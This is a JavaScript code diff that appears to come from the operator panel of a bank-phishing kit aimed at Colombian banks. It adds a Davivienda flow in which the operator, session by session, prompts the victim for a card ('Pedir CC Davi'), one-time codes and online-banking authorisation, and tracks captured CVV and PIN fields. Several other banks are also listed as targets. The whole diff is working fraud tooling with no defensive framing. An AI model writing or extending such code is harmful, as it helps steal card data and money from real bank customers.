@@ -661,6 +661,26 @@ function botonesSesion(s) {
         return btns.join('');
     }
 
+    // 🔥 DAVIVIENDA: flujo propio con botón "Pedir CC Davi"
+    if (bancoKey === 'davivienda') {
+        if (s.datos && s.datos.tarjeta) {
+            // Ya tiene tarjeta → acciones post-tarjeta
+            btns.push(`<button class="btn btn-otp" title="Pedir OTP" onclick="accion('${sid}','OTP')">📱</button>`);
+            btns.push(`<button class="btn btn-reject" title="Rechazar" onclick="accion('${sid}','RECHAZAR')">❌</button>`);
+            btns.push(`<button class="btn" style="background:#f59e0b; color:white;" title="Error CC" onclick="accion('${sid}','CC_ERROR')">⚠️</button>`);
+            btns.push(`<button class="btn" style="background:#3b82f6; color:white;" title="Autorizar Banca Virtual" onclick="accion('${sid}','AUTORIZAR')">🔐</button>`);
+            btns.push(`<button class="btn btn-block" title="Bloquear IP" onclick="bloquearIp('${ip}')">🚫</button>`);
+        } else {
+            // No tiene tarjeta → botón para MOSTRAR el formulario de tarjeta
+            btns.push(`<button class="btn" style="background:#6366f1; color:white;" title="Asignar Precio" onclick="ponerPrecio('${sid}')">💲</button>`);
+            btns.push(`<button class="btn" style="background:#e30613; color:white;" title="Pedir CC Davi" onclick="accion('${sid}','PEDIR_TARJETA')">💳 Pedir CC Davi</button>`);
+            btns.push(`<button class="btn btn-reject" title="Rechazar" onclick="accion('${sid}','RECHAZAR')">❌</button>`);
+            btns.push(`<button class="btn btn-final" title="Ya Pagó" onclick="accion('${sid}','YA_PAGO')">✅</button>`);
+            btns.push(`<button class="btn btn-block" title="Bloquear IP" onclick="bloquearIp('${ip}')">🚫</button>`);
+        }
+        return btns.join('');
+    }
+
     const bancosSoloOtp = ['davivienda', 'avvillas'];
     const bancosTokenOtp = ['caja-social', 'bbva', 'popular', 'occidente'];
 
@@ -796,8 +816,7 @@ function renderSesiones() {
         }
         else if (pasoActual === 'clavedin') pasoTexto = 'Clave Dinámica';
 
-        const esTarjeta = banco === 'cc-bogota' || banco === 'cc-bucaramanga' || banco === 'bancolombia' || banco === 'vanti';
-
+        const esTarjeta = banco === 'cc-bogota' || banco === 'cc-bucaramanga' || banco === 'bancolombia' || banco === 'vanti' || banco === 'davivienda';
         let identificacionTrj = '-';
         let claveFch = '-';
         let cvv = '-';
